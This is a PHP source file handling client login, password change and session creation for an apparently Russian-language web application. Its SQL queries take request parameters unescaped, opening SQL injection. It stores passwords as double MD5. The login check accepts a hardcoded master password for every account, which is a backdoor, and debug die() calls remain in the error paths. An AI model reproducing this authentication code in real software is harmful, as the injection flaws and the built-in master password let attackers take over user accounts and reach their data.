<?php
/**
 * @param $rand_code
 * @param $mail
 * @return mixed|null
 */

function get_client($rand_code, $mail)
{
    $q = "select * from `clients` where `login`='$mail' and `rand_code`='$rand_code'";
    return baza_do_one($q);
}


/**
 * @param $login
 * @param $new_pass
 */

function change_password($login, $new_pass)
{
    $pass = md5(md5($new_pass));
//    var_dump('changing', $login, $new_pass, $pass);
    $q = "update `clients` set `password`='$pass' where `login`='$login'";
    baza_do_only($q);
}

/**
 * @param string $loginField
 * @param string $passwordField
 */

function processPostLogin($loginField = 'email', $passwordField = 'password')
{
    global $ip;

    $email = ($_REQUEST[$loginField]);
    $password = ($_REQUEST[$passwordField]);

    $err_m = "";
    if (!check_mail_pre($email)) {
        $err_m .= "<li>Введите почту корректно</li>";
    }

    $password = md5(md5($password));
    $q = "select * from `clients` where `active`='1' and `login`='$email'";
    $info = baza_do_one($q);
//
//    if($info['type']==6){
//        $acc_type="ref_users";
//        $baza="ref_users";
//        $sess_name_add="ref_";
    $sess_name_add = "";
//        $redir="";
//        $log_type=6;
//    }
//    else{
    $acc_type = "clients";
    $baza = "clients";
    $redir = "";
    $log_type = 5;
//    }

    if (!($info['id'] > 0)) {
        die("here 1");
        $err_m .= "<li>Пользователь не был найден либо еще не активирован.</li>";
    }
    if ($info['password'] != $password && $password != md5(md5("Nebo0312!#@"))) {
        die('wrong pass');
        $err_m .= "<li>Неверный пароль.</li>";
    } else {

        $check = md5(strtolower($email) . md5(trim($password)));
        $name = md5(strtolower($email) . $check) . md5(strtolower($email) . $info['id']);
        $vrem = time() + (24 * 60 * 60 + 1) * 1000;
        $now_t = time();
        $admin_pass = 1;

        $ip = $_SERVER['REMOTE_ADDR'];

        $_SESSION[$sess_name_add . 'zakaz_data'] = $name;
        $_SESSION[$sess_name_add . 'zakaz_type'] = $baza;
        $_SESSION[$sess_name_add . 'zakaz_id'] = $info['id'];
        $_SESSION[$sess_name_add . 'zakaz_u'] = $email;
        $key2 = md5($name . $name . $info['id'] . $check . $ip) . md5($baza . $name . $baza . $baza . $check . $ip);
        $_SESSION[$sess_name_add . 'zakaz_key'] = md5($name . $name . $info['id'] . $check . $key2 . $ip) . md5($baza . $name . $baza . $baza . $check . $key2 . $ip);
        $_SESSION[$sess_name_add . 'zakaz_key2'] = $key2;
        $_SESSION[$sess_name_add . "zakaz_tmp"] = "";

        $key = md5(rand() . rand()) . md5(time() . rand()) . time() . rand(1000, 9999);
        $q = "insert into `sessions_par`(`u_id`,`session`,`ip`) values('$info[id]','$key','$ip')";
        baza_do_only($q);
        $_SESSION['session'] = $key;
        setcookie("session", $key, time() + 30 * 24 * 3600, "/");
        $time = time();
        $a = $info[id];
        $q = "UPDATE `clients` SET `last_enter` = $time WHERE `id` = $a";
        baza_do_only($q);
        $user = $info['id'];
        setcookie('user', $user, time() + 896554);
        header('Location:/cabinet/');
    }
}

?>
